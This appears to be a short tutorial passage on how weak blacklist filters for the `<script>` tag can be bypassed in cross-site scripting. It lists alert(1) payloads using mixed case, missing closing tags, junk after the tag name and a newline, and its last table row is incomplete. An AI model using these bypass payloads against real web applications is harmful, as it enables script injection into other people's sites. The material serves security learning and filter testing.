Blacklisting Filters is the most filter mechanism being used. These type of filter's common goal is to detect specific patterns to prevent malicious behaviors.

The `<script>` tag is the primary method to execute JavaScript.

Some filters do not cover all possible cases, making them weak and prone to bypass techniques. The following is an example of few bypasses for weak `<script>` tag filter rules:

| Bypass Payload                      | Description                                                    |
| ----------------------------------- | -------------------------------------------------------------- |
| `<ScRiPt>alert(1);</ScRiPt>`        | Mixed of upper and lower-case characters.                      |
| `<ScRiPt>alert(1);`                 | Mixed of upper and lower-case characters, without closing tag. |
| `<script/random>alert(1);</script>` | Random string after the tag name.                              |
| `<script`<br>`>alert(1);</script>`  | New line after the tag name.                                   |
| `<script><`                         |                                                                |
|                                     |                                                                |
